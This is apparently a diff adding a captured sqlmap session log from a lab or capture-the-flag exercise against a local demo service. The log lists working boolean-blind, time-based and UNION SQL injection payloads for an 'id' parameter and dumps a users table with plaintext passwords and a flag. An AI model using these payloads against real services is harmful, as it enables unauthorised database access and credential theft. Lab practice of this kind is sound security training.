@@ -1,0 +1,59 @@
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.8.4#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 04:05:02 /2026-08-16/
+
+[1/1] URL:
+GET http://127.0.0.1:9001/user?id=1
+do you want to test this URL? [Y/n/q]
+> Y
+[04:05:02] [INFO] testing URL 'http://127.0.0.1:9001/user?id=1'
+[04:05:02] [INFO] resuming back-end DBMS 'sqlite' 
+[04:05:02] [INFO] using '/root/.local/share/sqlmap/output/results-08162026_0405am.csv' as the CSV results file in multiple targets mode
+[04:05:02] [INFO] testing connection to the target URL
+[04:05:02] [WARNING] turning off pre-connect mechanism because of incompatible server ('BaseHTTP/0.6 Python/3.12.3')
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 6137=6137
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: id=1 AND 3244=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(113,112,113,98,113)||CHAR(97,82,78,65,114,74,115,81,66,82,83,119,103,67,111,121,107,78,68,84,107,119,100,66,81,77,102,116,102,120,122,68,66,115,105,106,119,103,85,78)||CHAR(113,113,118,122,113),NULL-- deoU
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[04:05:02] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[04:05:02] [INFO] sqlmap will dump entries of all tables from all databases now
+[04:05:02] [INFO] fetching tables for database: 'SQLite_masterdb'
+[04:05:02] [INFO] fetching columns for table 'users' 
+[04:05:02] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[3 entries]
++----+---------------------------+----------+----------+
+| id | secret                    | password | username |
++----+---------------------------+----------+----------+
+| 1  | FLAG{IVE_DEMO_SQLI_ADMIN} | hunter2  | admin    |
+| 2  | nothing special           | password | user     |
+| 3  | secret_notes_bob          | qwerty   | bob      |
++----+---------------------------+----------+----------+
+
+[04:05:02] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/root/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/users.csv'
+[04:05:02] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-08162026_0405am.csv'
+[04:05:02] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 04:05:02 /2026-08-16/
+
